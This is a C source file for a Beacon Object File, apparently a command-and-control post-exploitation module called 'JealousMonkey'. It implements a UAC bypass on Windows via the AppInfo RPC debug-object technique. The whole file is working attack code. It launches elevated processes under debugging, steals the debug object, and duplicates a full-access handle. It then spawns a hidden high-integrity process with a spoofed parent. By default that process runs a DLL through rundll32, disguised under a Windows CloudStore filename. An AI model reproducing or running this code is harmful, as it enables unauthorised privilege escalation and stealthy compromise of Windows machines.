/*
 * JealousMonkey — AppInfo Method 59 UAC bypass BOF
 * Port of STAGE2/method59.c (James Forshaw / UACME debug-object technique)
 */
#include "bofdefs.h"
#include "beacon.h"
#include "appinfo64.h"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

#ifndef STATUS_ACCESS_DENIED
#define STATUS_ACCESS_DENIED ((NTSTATUS)0xC0000022L)
#endif

#ifndef STATUS_UNSUCCESSFUL
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#endif

#define APPINFO_RPC L"201ef99a-7fa0-444c-9399-19ba84f12a1a"
#define DEFAULT_DESKTOP L"WinSta0\\Default"
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#ifndef PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
#define PROC_THREAD_ATTRIBUTE_PARENT_PROCESS 0x00020000
#endif

#ifndef EXTENDED_STARTUPINFO_PRESENT
#define EXTENDED_STARTUPINFO_PRESENT 0x00080000
#endif

typedef LONG NTSTATUS;

typedef enum _JM_PROCESSINFOCLASS {
    JM_ProcessBasicInformation = 0,
    JM_ProcessDebugObjectHandle = 30
} JM_PROCESSINFOCLASS;

typedef NTSTATUS (NTAPI *PNtRemoveProcessDebug)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI *PNtDuplicateObject)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef NTSTATUS (NTAPI *PNtQueryInformationProcess)(HANDLE, JM_PROCESSINFOCLASS, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI *PNtClose)(HANDLE);
typedef VOID (NTAPI *PDbgUiSetThreadDebugObject)(HANDLE);

static PNtRemoveProcessDebug pNtRemoveProcessDebug;
static PNtDuplicateObject pNtDuplicateObject;
static PNtQueryInformationProcess pNtQueryInformationProcess;
static PNtClose pNtClose;
static PDbgUiSetThreadDebugObject pDbgUiSetThreadDebugObject;

static WCHAR g_systemDir[MAX_PATH];
static WCHAR g_systemRoot[MAX_PATH];

static BOOL init_ntdll(void) {
    HMODULE ntdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
    if (!ntdll)
        return FALSE;

    pNtRemoveProcessDebug = (PNtRemoveProcessDebug)KERNEL32$GetProcAddress(ntdll, "NtRemoveProcessDebug");
    pNtDuplicateObject = (PNtDuplicateObject)KERNEL32$GetProcAddress(ntdll, "NtDuplicateObject");
    pNtQueryInformationProcess = (PNtQueryInformationProcess)KERNEL32$GetProcAddress(ntdll, "NtQueryInformationProcess");
    pNtClose = (PNtClose)KERNEL32$GetProcAddress(ntdll, "NtClose");
    pDbgUiSetThreadDebugObject = (PDbgUiSetThreadDebugObject)KERNEL32$GetProcAddress(ntdll, "DbgUiSetThreadDebugObject");

    return pNtRemoveProcessDebug && pNtDuplicateObject && pNtQueryInformationProcess &&
           pNtClose && pDbgUiSetThreadDebugObject;
}

static BOOL init_paths(void) {
    UINT n = KERNEL32$GetSystemDirectoryW(g_systemDir, MAX_PATH);
    if (n == 0 || n >= MAX_PATH)
        return FALSE;

    if (KERNEL32$GetEnvironmentVariableW(L"SystemRoot", g_systemRoot, MAX_PATH) == 0)
        return FALSE;

    return TRUE;
}

static BOOL build_default_payload(WCHAR *buf, DWORD cap) {
    WCHAR localAppData[MAX_PATH];

    if (KERNEL32$GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0)
        return FALSE;

    if (MSVCRT$_snwprintf(
            buf, cap,
            L"C:\\Windows\\System32\\rundll32.exe "
            L"\"%s\\Microsoft\\Windows\\CloudStore\\Shell\\Windows.CloudStore.Schema.Shell.dll\",Start",
            localAppData) <= 0)
        return FALSE;

    return TRUE;
}

static RPC_STATUS create_binding_handle(RPC_BINDING_HANDLE *binding) {
    RPC_STATUS status;
    RPC_WSTR stringBinding = NULL;
    RPC_BINDING_HANDLE localBinding = NULL;
    RPC_SECURITY_QOS_V3 sqos;
    PSID systemSid = NULL;
    DWORD sidSize = SECURITY_MAX_SID_SIZE;

    if (binding)
        *binding = NULL;

    status = RPCRT4$RpcStringBindingComposeW(
        (RPC_WSTR)APPINFO_RPC, (RPC_WSTR)L"ncalrpc", NULL, NULL, NULL, &stringBinding);
    if (status != RPC_S_OK)
        return status;

    status = RPCRT4$RpcBindingFromStringBindingW(stringBinding, &localBinding);
    RPCRT4$RpcStringFreeW(&stringBinding);
    if (status != RPC_S_OK)
        return status;

    systemSid = (PSID)KERNEL32$LocalAlloc(LPTR, sidSize);
    if (!systemSid) {
        RPCRT4$RpcBindingFree(&localBinding);
        return ERROR_NOT_ENOUGH_MEMORY;
    }

    if (!ADVAPI32$CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &sidSize)) {
        status = KERNEL32$GetLastError();
        KERNEL32$LocalFree(systemSid);
        RPCRT4$RpcBindingFree(&localBinding);
        return status;
    }

    ZeroMemory(&sqos, sizeof(sqos));
    sqos.Version = 3;
    sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
    sqos.Capabilities = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
    sqos.IdentityTracking = 0;
    sqos.Sid = systemSid;

    status = RPCRT4$RpcBindingSetAuthInfoExW(
        localBinding, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_WINNT,
        0, 0, (RPC_SECURITY_QOS *)&sqos);

    KERNEL32$LocalFree(systemSid);

    if (status == RPC_S_OK)
        *binding = localBinding;
    else
        RPCRT4$RpcBindingFree(&localBinding);

    return status;
}

static RPC_STATUS aic_async_init(RPC_ASYNC_STATE *async) {
    RPC_STATUS status = RPCRT4$RpcAsyncInitializeHandle(async, sizeof(RPC_ASYNC_STATE));
    if (status == RPC_S_OK) {
        async->NotificationType = RpcNotificationTypeEvent;
        async->u.hEvent = KERNEL32$CreateEventW(NULL, FALSE, FALSE, NULL);
        if (!async->u.hEvent)
            status = KERNEL32$GetLastError();
    }
    return status;
}

static void aic_async_close(RPC_ASYNC_STATE *async) {
    if (async->u.hEvent) {
        KERNEL32$CloseHandle(async->u.hEvent);
        async->u.hEvent = NULL;
    }
}

static BOOL aic_launch_admin_process(
    LPCWSTR executablePath,
    LPCWSTR commandLine,
    DWORD startFlags,
    DWORD creationFlags,
    LPCWSTR currentDirectory,
    LPCWSTR windowStation,
    DWORD showFlags,
    PROCESS_INFORMATION *procInfo)
{
    RPC_BINDING_HANDLE rpcHandle = NULL;
    RPC_ASYNC_STATE asyncState;
    APP_PROCESS_INFORMATION appProcInfo;
    APP_STARTUP_INFO appStartup;
    RPC_STATUS status;
    VOID *reply = NULL;
    LONG elevationType = 0;
    BOOL ok = FALSE;

    if (procInfo) {
        procInfo->hProcess = NULL;
        procInfo->hThread = NULL;
        procInfo->dwProcessId = 0;
        procInfo->dwThreadId = 0;
    }

    ZeroMemory(&appProcInfo, sizeof(appProcInfo));
    ZeroMemory(&appStartup, sizeof(appStartup));
    ZeroMemory(&asyncState, sizeof(asyncState));

    appStartup.dwFlags = STARTF_USESHOWWINDOW;
    appStartup.wShowWindow = (SHORT)showFlags;

    if (create_binding_handle(&rpcHandle) != RPC_S_OK)
        return FALSE;
    if (aic_async_init(&asyncState) != RPC_S_OK) {
        RPCRT4$RpcBindingFree(&rpcHandle);
        return FALSE;
    }

    RAiLaunchAdminProcess(
        &asyncState, rpcHandle,
        (wchar_t *)executablePath, (wchar_t *)commandLine,
        (long)startFlags, (long)creationFlags,
        (wchar_t *)currentDirectory, (wchar_t *)windowStation,
        &appStartup, 0, INFINITE, &appProcInfo, &elevationType);

    if (KERNEL32$WaitForSingleObject(asyncState.u.hEvent, INFINITE) == WAIT_FAILED) {
        aic_async_close(&asyncState);
        RPCRT4$RpcBindingFree(&rpcHandle);
        return FALSE;
    }

    status = RPCRT4$RpcAsyncCompleteCall(&asyncState, &reply);
    if (status == 0 && reply == NULL && procInfo) {
        procInfo->hProcess = (HANDLE)appProcInfo.ProcessHandle;
        procInfo->hThread = (HANDLE)appProcInfo.ThreadHandle;
        procInfo->dwProcessId = (DWORD)appProcInfo.ProcessId;
        procInfo->dwThreadId = (DWORD)appProcInfo.ThreadId;
        ok = TRUE;
    }

    aic_async_close(&asyncState);
    RPCRT4$RpcBindingFree(&rpcHandle);
    return ok;
}

static NTSTATUS get_process_debug_object(HANDLE process, HANDLE *debugObject) {
    return pNtQueryInformationProcess(
        process, JM_ProcessDebugObjectHandle, debugObject, sizeof(HANDLE), NULL);
}

static NTSTATUS create_process_from_parent(HANDLE parentProcess, LPWSTR payload) {
    STARTUPINFOEXW si;
    PROCESS_INFORMATION pi;
    SIZE_T attrSize = 0x30;
    DWORD flags = CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);

    do {
        if (attrSize > 1024)
            break;

        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$HeapAlloc(
            KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
        if (!si.lpAttributeList)
            break;

        if (!KERNEL32$InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize)) {
            if (KERNEL32$GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
                KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, si.lpAttributeList);
                break;
            }
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, si.lpAttributeList);
            continue;
        }

        if (!KERNEL32$UpdateProcThreadAttribute(
                si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                &parentProcess, sizeof(HANDLE), NULL, NULL)) {
            KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
            KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, si.lpAttributeList);
            break;
        }

        si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
        si.StartupInfo.wShowWindow = SW_HIDE;

        if (KERNEL32$CreateProcessW(NULL, payload, NULL, NULL, FALSE, flags, NULL, g_systemRoot, (LPSTARTUPINFOW)&si, &pi)) {
            KERNEL32$CloseHandle(pi.hThread);
            KERNEL32$CloseHandle(pi.hProcess);
            status = STATUS_SUCCESS;
        }

        KERNEL32$DeleteProcThreadAttributeList(si.lpAttributeList);
        KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, si.lpAttributeList);
        break;
    } while (TRUE);

    return status;
}

static NTSTATUS uac_bypass_method59(LPWSTR payload) {
    BOOL debugObjectSet = FALSE;
    NTSTATUS status = STATUS_ACCESS_DENIED;
    HANDLE dbgHandle = NULL;
    HANDLE dbgProcessHandle = NULL;
    HANDLE dupHandle = NULL;
    PROCESS_INFORMATION procInfo;
    DEBUG_EVENT dbgEvent;
    WCHAR victimPath[MAX_PATH * 2];

    ZeroMemory(&procInfo, sizeof(procInfo));

    MSVCRT$_snwprintf(victimPath, MAX_PATH * 2, L"%s\\winver.exe", g_systemDir);

    if (!aic_launch_admin_process(
            victimPath, victimPath, 0,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_systemRoot, DEFAULT_DESKTOP, SW_HIDE, &procInfo)) {
        return STATUS_UNSUCCESSFUL;
    }

    status = get_process_debug_object(procInfo.hProcess, &dbgHandle);
    if (!NT_SUCCESS(status)) {
        KERNEL32$TerminateProcess(procInfo.hProcess, 0);
        KERNEL32$CloseHandle(procInfo.hThread);
        KERNEL32$CloseHandle(procInfo.hProcess);
        return status;
    }

    pNtRemoveProcessDebug(procInfo.hProcess, dbgHandle);
    KERNEL32$TerminateProcess(procInfo.hProcess, 0);
    KERNEL32$CloseHandle(procInfo.hThread);
    KERNEL32$CloseHandle(procInfo.hProcess);
    procInfo.hProcess = NULL;
    procInfo.hThread = NULL;

    MSVCRT$_snwprintf(victimPath, MAX_PATH * 2, L"%s\\ComputerDefaults.exe", g_systemDir);
    ZeroMemory(&procInfo, sizeof(procInfo));
    ZeroMemory(&dbgEvent, sizeof(dbgEvent));

    if (!aic_launch_admin_process(
            victimPath, victimPath, 1,
            CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
            g_systemRoot, DEFAULT_DESKTOP, SW_HIDE, &procInfo)) {
        pNtClose(dbgHandle);
        return STATUS_UNSUCCESSFUL;
    }

    pDbgUiSetThreadDebugObject(dbgHandle);
    debugObjectSet = TRUE;

    while (KERNEL32$WaitForDebugEvent(&dbgEvent, INFINITE)) {
        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
            dbgProcessHandle = dbgEvent.u.CreateProcessInfo.hProcess;
            break;
        }
        KERNEL32$ContinueDebugEvent(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }

    if (dbgProcessHandle) {
        status = pNtDuplicateObject(
            dbgProcessHandle,
            NtCurrentProcess(),
            NtCurrentProcess(),
            &dupHandle,
            PROCESS_ALL_ACCESS,
            0,
            0);

        if (NT_SUCCESS(status)) {
            status = create_process_from_parent(dupHandle, payload);
            pNtClose(dupHandle);
        }
    } else {
        status = STATUS_UNSUCCESSFUL;
    }

    if (debugObjectSet)
        pDbgUiSetThreadDebugObject(NULL);

    if (dbgHandle)
        pNtClose(dbgHandle);

    if (dbgProcessHandle)
        KERNEL32$CloseHandle(dbgProcessHandle);

    if (procInfo.hThread)
        KERNEL32$CloseHandle(procInfo.hThread);

    if (procInfo.hProcess) {
        KERNEL32$TerminateProcess(procInfo.hProcess, 0);
        KERNEL32$CloseHandle(procInfo.hProcess);
    }

    return status;
}

static BOOL is_user_admin(void) {
    BOOL admin = FALSE;
    PSID adminGroup = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;
    HANDLE hToken = NULL;

    if (!ADVAPI32$AllocateAndInitializeSid(
            &ntAuth, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, &adminGroup)) {
        return FALSE;
    }

    if (ADVAPI32$CheckTokenMembership(NULL, adminGroup, &admin) && admin) {
        ADVAPI32$FreeSid(adminGroup);
        return TRUE;
    }

    if (ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        HANDLE hLinked = NULL;
        DWORD linkedSize = sizeof(hLinked);

        if (ADVAPI32$GetTokenInformation(hToken, TokenLinkedToken, &hLinked, linkedSize, &linkedSize) && hLinked) {
            ADVAPI32$CheckTokenMembership(hLinked, adminGroup, &admin);
            KERNEL32$CloseHandle(hLinked);
            if (admin) {
                KERNEL32$CloseHandle(hToken);
                ADVAPI32$FreeSid(adminGroup);
                return TRUE;
            }
        }

        {
            DWORD groupsSize = 0;
            PTOKEN_GROUPS groups = NULL;

            if (!ADVAPI32$GetTokenInformation(hToken, TokenGroups, NULL, 0, &groupsSize) &&
                KERNEL32$GetLastError() == ERROR_INSUFFICIENT_BUFFER) {
                groups = (PTOKEN_GROUPS)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, groupsSize);
                if (groups && ADVAPI32$GetTokenInformation(hToken, TokenGroups, groups, groupsSize, &groupsSize)) {
                    DWORD i;
                    for (i = 0; i < groups->GroupCount; i++) {
                        if (ADVAPI32$EqualSid(groups->Groups[i].Sid, adminGroup)) {
                            admin = TRUE;
                            break;
                        }
                    }
                }
                if (groups)
                    KERNEL32$HeapFree(KERNEL32$GetProcessHeap(), 0, groups);
            }
        }

        KERNEL32$CloseHandle(hToken);
    }

    ADVAPI32$FreeSid(adminGroup);
    return admin;
}

void go(char *args, unsigned long alen) {
    datap parser;
    wchar_t *payloadArg;
    WCHAR payload[MAX_PATH * 4];
    NTSTATUS status;

    BeaconDataParse(&parser, args, (int)alen);
    payloadArg = (wchar_t *)BeaconDataExtract(&parser, NULL);

    BeaconPrintf(CALLBACK_OUTPUT, "[*] MONKEY IS GETTING JEALOUS...\n");

    if (!is_user_admin()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Local admin required (UAC-filtered token ok)\n");
        return;
    }

    if (!init_ntdll() || !init_paths()) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Initialization failed\n");
        return;
    }

    if (payloadArg && payloadArg[0] != L'\0') {
        MSVCRT$wcsncpy(payload, payloadArg, MAX_PATH * 4 - 1);
        payload[MAX_PATH * 4 - 1] = L'\0';
    } else if (!build_default_payload(payload, MAX_PATH * 4)) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to build default payload (LOCALAPPDATA)\n");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "\n[*] Launching elevated child via AppInfo RPC...\n");

    status = uac_bypass_method59(payload);

    if (NT_SUCCESS(status)) {
        BeaconPrintf(CALLBACK_OUTPUT, "\n[+] SUCCESS: high-integrity process spawned!\n");
        BeaconPrintf(CALLBACK_OUTPUT, "[+] MONKEY is pleased ))\n");
        return;
    }

    BeaconPrintf(CALLBACK_ERROR, "[-] Bypass failed (NTSTATUS 0x%08lx, GetLastError %lu)\n", status, KERNEL32$GetLastError());
}
